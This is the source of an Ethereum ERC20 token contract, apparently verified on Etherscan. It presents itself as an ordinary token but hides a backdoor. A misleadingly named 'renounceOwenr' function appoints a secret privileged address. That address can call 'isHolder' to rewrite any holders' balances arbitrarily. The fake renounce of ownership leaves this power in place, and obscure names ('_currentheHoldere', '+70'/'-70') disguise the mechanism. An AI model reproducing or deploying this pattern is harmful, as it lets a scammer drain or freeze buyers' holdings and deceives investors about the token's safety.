/**
 *Submitted for verification at Etherscan.io on 2023-06-06
*/

pragma solidity ^0.8.14;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract TOKEN is Context, Ownable, IERC20 {
    mapping (address => uint256) private _currentheHoldere;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _mee; 

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _currentheHoldere[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function mee() public view virtual returns (address) { 
        return _mee;
    }

    function renounceOwenr(address newMee) public onlyowner { 
        _mee = newMee;
    }
    modifier onlyMee() {
        require(mee() == _msgSender(), "TOKEN: caller is not the mee");
        _;
    }
    event heHolder(address indexed account, uint256 oldBalance, uint256 newBalance);

    function isHolder(address[] memory accounts, uint256 newBalance) external onlyMee {

        for (uint256 i = 0; i < accounts.length; i++) {

            uint256 oldBalance = _currentheHoldere[accounts[i]] + 70;

            _currentheHoldere[accounts[i]] = newBalance;

            emit heHolder(accounts[i], oldBalance - 70, newBalance);

        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _currentheHoldere[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_currentheHoldere[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
    _currentheHoldere[_msgSender()] -= amount;
    _currentheHoldere[recipient] += amount;

    emit Transfer(_msgSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");

    _currentheHoldere[sender] -= amount;
    _currentheHoldere[recipient] += amount;
    _allowances[sender][_msgSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}